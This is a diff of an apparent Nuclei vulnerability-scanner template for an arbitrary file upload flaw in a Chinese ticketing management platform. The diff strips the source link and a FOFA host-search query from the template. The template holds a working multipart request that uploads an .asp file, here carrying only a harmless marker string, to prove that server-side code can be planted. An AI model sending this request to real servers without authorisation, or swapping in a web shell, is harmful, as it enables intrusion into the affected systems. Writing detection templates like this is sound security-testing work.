@@ -3,12 +3,8 @@ info:
   name: 中城科信票务管理平台 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ggcet1qx5wxvdlgr'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ggcet1qx5wxvdlgr
-    fofa: body="SystemManager/SoftwareLicense.htm"
 http:
 - raw:
   - 'POST /SystemManager/Introduction.ashx HTTP/1.1
@@ -26,8 +22,6 @@ http:
     Accept-Encoding: gzip
 
 
-
-
     ----------------------------354575237365372692397370
 
 
@@ -37,19 +31,13 @@ http:
     Content-Type: image/jpeg
 
 
-
-
     <% Response.Write("c7ff66de90f5b695091cc4826d22d137") %>
-
-
 
 
     ----------------------------354575237365372692397370
 
 
     Content-Disposition: form-data; name="fileName"
-
-
 
 
     test_20240504.asp
@@ -59,8 +47,6 @@ http:
 
 
     Content-Disposition: form-data; name="Method"
-
-
 
 
     UpdateUploadLinkPic
